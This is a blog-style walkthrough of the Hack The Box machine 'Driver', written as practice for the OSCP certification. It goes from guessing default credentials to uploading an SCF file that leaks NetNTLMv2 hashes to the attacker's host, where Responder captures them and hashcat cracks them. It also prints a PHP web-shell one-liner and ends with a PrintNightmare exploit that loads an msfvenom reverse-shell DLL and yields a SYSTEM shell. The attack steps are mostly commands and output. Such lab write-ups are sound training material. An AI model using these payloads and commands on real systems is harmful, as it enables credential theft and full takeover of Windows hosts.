---
layout: post
title: Hack The Box - Driver
---

I have spent much of the past few months preparing for OSCP, so I haven't posted one of these in a while, I thought it was about time to change that. Here is my walkthrough of the "Driver" box on [HackTheBox](https://www.hackthebox.eu)

---
[![](/assets/image/attachments/Pasted&#32;image&#32;20211029172229.png)](/assets/image/attachments/Pasted&#32;image&#32;20211029172229.png){:.glightbox}


## Port scan
I ran rustscan followed by a full nmap scan:

> `rustscan -a 10.10.11.106 --ulimit 5000 -b 400 -t 7500  -- -sC -sV -oN 10.10.11.106`


```
Open 10.10.11.106:80
Open 10.10.11.106:135
Open 10.10.11.106:445
Open 10.10.11.106:5985

...

PORT     STATE SERVICE      REASON  VERSION
80/tcp   open  http         syn-ack Microsoft IIS httpd 10.0
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
135/tcp  open  msrpc        syn-ack Microsoft Windows RPC
445/tcp  open  microsoft-ds syn-ack Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h15m08s, deviation: 0s, median: 7h15m07s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 36299/tcp): CLEAN (Timeout)
|   Check 2 (port 18115/tcp): CLEAN (Timeout)
|   Check 3 (port 26928/udp): CLEAN (Timeout)
|   Check 4 (port 51650/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-10-29T20:18:43
|_  start_date: 2021-10-29T18:32:51


```
Things to note
- Microsoft IIS httpd 10.0
- Microsoft Windows 7 - 10

full scan, `nmap -p- -sS -T4 10.10.11.106` 

```
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
5985/tcp open  wsman

```

udp scan `nmap --top-ports 100 -sUV 10.10.11.106`

```
Host is up (0.071s latency).
All 100 scanned ports on 10.10.11.106 are open|filtered
```


## SMB port 445 enumeration
trying to list shares
```
└─$ smbclient -L 10.10.11.106
Enter WORKGROUP\kali's password:
session setup failed: NT_STATUS_ACCESS_DENIED
```

empty credentials fail, trying with `admin:admin`

```
└─$ smbclient -L 10.10.11.106 -U 'admin'
Enter WORKGROUP\admin's password:
session setup failed: NT_STATUS_LOGON_FAILURE
```

## WinRM 5985 enumeration
trying `admin:admin`

```
evil-winrm -i 10.10.11.106 -u admin -p admin

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1

```

## HTTP port 80 enumeration
upon navigating to http://10.10.11.106/ in a web browser we are prompted for a login

[![](/assets/image/attachments/Pasted&#32;image&#32;20211029135840.png)](/assets/image/attachments/Pasted&#32;image&#32;20211029135840.png){:.glightbox}

trying a few defaults such as:
```
admin:password
admin:secret
admin:admin
```

we get access using `admin:admin`

this redirects us to a web application "MFP Firmware update centre". It appears to be used for managing firmware updates for printers.

we find an email address on the home page `support@driver.htb`

by trying to navigate to `http://10.10.11.106/index.php` we are redirected to the home page confirming this is a php webapp

[![](/assets/image/attachments/Pasted&#32;image&#32;20211029140427.png)](/assets/image/attachments/Pasted&#32;image&#32;20211029140427.png){:.glightbox}

Using the Firmware Updates tab we can upload a firmware configuration file for a specified printer model. It seems possible that we might be able to upload a reverse shell via this method.

we will try using a simple php backdoor shell

```php
<?php if(isset($_REQUEST['gg'])){echo "<pre>";$cmd=($_REQUEST['gg']);system($cmd);echo "</pre>";die;}?>
```

we can upload the file successfully but have no awareness of where on the server it might be stored. Let's try directory bruteforcing to try and find a location. I do this using `ffuf`

> `ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt  -u 'http://10.10.11.106/FUZZ'  -e .php`

```bash
images                  [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 66ms]
index.php               [Status: 401, Size: 20, Words: 2, Lines: 2, Duration: 78ms]
Images                  [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 66ms]
.                       [Status: 401, Size: 20, Words: 2, Lines: 2, Duration: 70ms]
Index.php               [Status: 401, Size: 20, Words: 2, Lines: 2, Duration: 66ms]
IMAGES                  [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 79ms]
INDEX.php               [Status: 401, Size: 20, Words: 2, Lines: 2, Duration: 80ms]

```

Hmm nothing useful. Reading the message on the upload page again

"   Select printer model and upload the respective firmware update ***to our file share***. Our testing team will ***review the uploads manually*** and initiates the testing soon. "

I passed over this on the first reading not realising the potential this creates. We can:
- Create a file on the SMB share (via file upload on web interface)
- Have a user browse the share to look at that file

With this combination, we can cause the user to authenticate back to us and capture their hash with responder.

## foothold

I have used to following [blog](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/) as reference for this section.

we create an SCF file that will try to fetch an icon from us, allowing us to capture the hash of the user browsing the file share with responder

```ini
[Shell]
Command=2
IconFile=\\<MY-IP>\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop

```

now we start responder with the following arguments
```bash
responder -wrf --lm -v -I tun0
```

now uploading the file we get hashes captured on responder

[![](/assets/image/attachments/Pasted&#32;image&#32;20211029152004.png)](/assets/image/attachments/Pasted&#32;image&#32;20211029152004.png){:.glightbox}

the hashes appear different each time although it is the same user, I am slightly confused about this but I hypothesise it is some randomization invovled in the NetNTLM scheme.

Regardless, I will try cracking all of them to see what happens. I place all of the hashes into a file named `hashes`.

```
tony::DRIVER:6cc46b738ab0e0d6:8646E6EE5D72568624A7FA8EBB0F503E:01010000000000005FC32D1A0CCDD70123ED97D5DB7083FF00000000020000000000000000000000
tony::DRIVER:596a4a8e87c4306c:90A4A7E2669AE893F1694F7FBD7E7817:0101000000000000974A561A0CCDD701E25B0E80E5202CFD00000000020000000000000000000000
tony::DRIVER:9bc7f66784607340:18E7074468F619823498EFF989ED9EC9:0101000000000000E40D7A1A0CCDD7013BCE054CAB537F9900000000020000000000000000000000
tony::DRIVER:09fd3ab9928b6acd:3F20C4E8A6731012A625400020D45BE3:01010000000000000DD19D1A0CCDD701BA0B6534A45A82A200000000020000000000000000000000
tony::DRIVER:01e91b545ecd0bb1:8314E37EE427AF5AC1FF9ED72D662E7F:01010000000000001295C11A0CCDD701A12C741F24092E9300000000020000000000000000000000
tony::DRIVER:cdb2155e0dd1ca60:26E32D0F2272829A2CE73131152FD0C8:0101000000000000B1BAE71A0CCDD701732DCE98A74FE65400000000020000000000000000000000
tony::DRIVER:a299562738329bed:04E46B430825F98A443BC46FC7B38BE0:0101000000000000551B091B0CCDD7015C18559AFDCD707C00000000020000000000000000000000
```

I confirm the hash type with `hashid`

```bash
$ hashid tony::DRIVER:a299562738329bed:04E46B430825F98A443BC46FC7B38BE0:0101000000000000551B091B0CCDD7015C18559AFDCD707C00000000020000000000000000000000
Analyzing 'tony::DRIVER:a299562738329bed:04E46B430825F98A443BC46FC7B38BE0:0101000000000000551B091B0CCDD7015C18559AFDCD707C00000000020000000000000000000000'
[+] NetNTLMv2

```

next I find the correct mode for `hashcat` to crack hashes of this type

```bash
$ hashcat --example-hashes | grep -i 'netntlm' -A 2 -B3

MODE: 5500
TYPE: NetNTLMv1 / NetNTLMv1+ESS
HASH: ::5V4T:ada06359242920a500000000000000000000000000000000:0556d5297b5daa70eaffde82ef99293a3f3bb59b7c9704ea:9c23f6c094853920
PASS: hashcat

MODE: 5600
TYPE: NetNTLMv2
HASH: 0UL5G37JOI0SX::6VB1IS0KA74:ebe1afa18b7fbfa6:aab8bf8675658dd2a939458a1077ba08:010100000000000031c8aa092510945398b9f7b7dde1a9fb00000000f7876f2b04b700
PASS: hashcat
```

`MODE: 5600` is what we are looking for. Now to perform the cracking. I run `hashcat` with the following command

```bash
hashcat -m 5600 hashes /usr/share/wordlists/rockyou.txt -O
```

as suspected all hashes crack to give the same password
```
...

TONY::DRIVER:a299562738329bed:04e46b430825f98a443bc46fc7b38be0:0101000000000000551b091b0ccdd7015c18559afdcd707c00000000020000000000000000000000:liltony
TONY::DRIVER:09fd3ab9928b6acd:3f20c4e8a6731012a625400020d45be3:01010000000000000dd19d1a0ccdd701ba0b6534a45a82a200000000020000000000000000000000:liltony
TONY::DRIVER:01e91b545ecd0bb1:8314e37ee427af5ac1ff9ed72d662e7f:01010000000000001295c11a0ccdd701a12c741f24092e9300000000020000000000000000000000:liltony
TONY::DRIVER:596a4a8e87c4306c:90a4a7e2669ae893f1694f7fbd7e7817:0101000000000000974a561a0ccdd701e25b0e80e5202cfd00000000020000000000000000000000:liltony
TONY::DRIVER:9bc7f66784607340:18e7074468f619823498eff989ed9ec9:0101000000000000e40d7a1a0ccdd7013bce054cab537f9900000000020000000000000000000000:liltony
TONY::DRIVER:cdb2155e0dd1ca60:26e32d0f2272829a2ce73131152fd0c8:0101000000000000b1bae71a0ccdd701732dce98a74fe65400000000020000000000000000000000:liltony

...

```

now we have credentials `tony:liltony`

my first instinct is to try WinRM. I use Evil-WinRM with the following command

```bash
evil-winrm -i 10.10.11.106 -u tony -p liltony
```

and we get a shell as tony!



## Privesc
I performed inital enumeration in my shell for a while but did not notice anything immediately. Then it struck me. The release data of this box, the naming choice, the printer firmware update webapp. They are all hinting it will be a printer related vulnerability. This first to spring to mind is the recent PrintNightmare vulnerability.

I have used this vulnerability before with the python script from cube0x0 found [here](https://github.com/cube0x0/CVE-2021-1675/issues/19)

Note for this version of the exploit a modified version of impacket is required. I install this in a virtual environment.

```bash
# create venv and activate
python3 -m venv .venv
source .venv/bin/activate

# clone both repositories
git clone https://github.com/cube0x0/CVE-2021-1675.git
git clone https://github.com/cube0x0/impacket

# navvigate to modified impacket and install with venv activated
cd impacket
python3 ./setup.py install
```

Now with the local setup required, we can proceed.

Firstly let's check if MS-RPRN enabled, this is required for the exploit to work remotely.
```bash
$ impacket-rpcdump driver/tony:liltony@10.10.11.106 | grep -i MS-RPRN
Protocol: [MS-RPRN]: Print System Remote Protocol

```
we see it is, so proceed.

For this exploit we need to host a malicious DLL. We can do this with the Samba server on kali. let's back up smb config for Samba. This new config will allow us to load our malicious dll from our Samba server on kali with no authentication. Some people have reported being able to do this using `impacket-smbserver` but I had no success trying this. Remember to revert this back to normal afterwards! 

```bash
mv /etc/samba/smb.conf /etc/samba/smb.conf.bk


# new config
/etc/samba/smb.conf ->

[global]
    map to guest = Bad User
    server role = standalone server
    usershare allow guests = yes
    idmap config * : backend = tdb
    smb ports = 445
    min protocol = SMB2

[smb]
    comment = Samba
    path = /tmp/
    guest ok = yes
    read only = no
    browsable = yes
    force user = nobody
```

make sure samba is started
```bash
sudo systemctl stop smbd
sudo systemctl start smbd
```

generate dll payload, note I have output it to `/tmp` which is where I have set the root of the smb server to point to.
```bash
$ msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=tun0 lport=443 -f dll -o /tmp/rev.dll
```

start up our listener
```bash
$ rlwrap nc -lvnp 443                             
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443

```

run script
```bash
$ python3 CVE-2021-1675/CVE-2021-1675.py driver/tony:liltony@10.10.11.106 '\\10.10.14.107\smb\rev.dll'
[*] Connecting to ncacn_np:10.10.11.106[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\10.10.14.107\smb\rev.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0
[*] Try 3...

```

and if no hiccups occur, receive shell!
```bash

...
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.106.
Ncat: Connection from 10.10.11.106:49491.
Microsoft Windows [Version 10.0.10240]
(c) 2015 Microsoft Corporation. All rights reserved.

whoami
whoami
nt authority\system


```

## flags
From here just read the flags :)
```
user:8490****************************
administrator:bcb4****************************
```

